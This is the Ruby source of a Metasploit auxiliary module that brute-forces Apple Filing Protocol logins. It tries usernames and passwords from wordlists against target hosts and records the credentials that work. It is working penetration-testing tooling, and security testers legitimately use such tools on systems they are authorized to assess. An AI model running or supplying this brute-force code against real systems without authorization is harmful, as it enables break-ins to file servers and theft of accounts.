##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'openssl'
require 'metasploit/framework/credential_collection'
require 'metasploit/framework/login_scanner/afp'

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::AuthBrute
  include Msf::Exploit::Remote::AFP

  def initialize(info={})
    super(update_info(info,
      'Name'         => 'Apple Filing Protocol Login Utility',
      'Description'  => %q{
        This module attempts to bruteforce authentication credentials for AFP.
      },
      'References'     =>
        [
          [ 'URL', 'https://developer.apple.com/library/mac/documentation/Networking/Reference/AFP_Reference/Reference/reference.html' ],
          [ 'URL', 'https://developer.apple.com/library/mac/documentation/networking/conceptual/afp/AFPSecurity/AFPSecurity.html' ]

        ],
      'Author'       => [ 'Gregory Man <man.gregory[at]gmail.com>' ],
      'License'      => MSF_LICENSE
    ))

    deregister_options('RHOST')
    register_options(
      [
        Opt::Proxies,
        OptInt.new('LoginTimeOut', [ true, "Timout on login", 23 ]),
        OptBool.new('RECORD_GUEST', [ false, "Record guest login to the database", false]),
        OptBool.new('CHECK_GUEST', [ false, "Check for guest login", true])
      ], self)

    deregister_options('PASSWORD_SPRAY')
  end

  def run_host(ip)
    print_status("Scanning IP: #{ip.to_s}")

    cred_collection = Metasploit::Framework::CredentialCollection.new(
        blank_passwords: datastore['BLANK_PASSWORDS'],
        pass_file: datastore['PASS_FILE'],
        password: datastore['PASSWORD'],
        user_file: datastore['USER_FILE'],
        userpass_file: datastore['USERPASS_FILE'],
        username: datastore['USERNAME'],
        user_as_pass: datastore['USER_AS_PASS'],
    )

    cred_collection = prepend_db_passwords(cred_collection)

    scanner = Metasploit::Framework::LoginScanner::AFP.new(
        host: ip,
        port: rport,
        proxies: datastore['PROXIES'],
        cred_details: cred_collection,
        stop_on_success: datastore['STOP_ON_SUCCESS'],
        bruteforce_speed: datastore['BRUTEFORCE_SPEED'],
        connection_timeout: 30,
        max_send_size: datastore['TCP::max_send_size'],
        send_delay: datastore['TCP::send_delay'],
        framework: framework,
        framework_module: self,
        ssl: datastore['SSL'],
        ssl_version: datastore['SSLVersion'],
        ssl_verify_mode: datastore['SSLVerifyMode'],
        ssl_cipher: datastore['SSLCipher'],
        local_port: datastore['CPORT'],
        local_host: datastore['CHOST']
    )

    scanner.scan! do |result|
      credential_data = result.to_h
      credential_data.merge!(
          module_fullname: self.fullname,
          workspace_id: myworkspace_id
      )
      if result.success?
        credential_core = create_credential(credential_data)
        credential_data[:core] = credential_core
        create_credential_login(credential_data)

        print_good "#{ip}:#{rport} - Login Successful: #{result.credential}"
      else
        invalidate_login(credential_data)
        vprint_error "#{ip}:#{rport} - LOGIN FAILED: #{result.credential} (#{result.status}: #{result.proof})"
      end
    end
  end


end
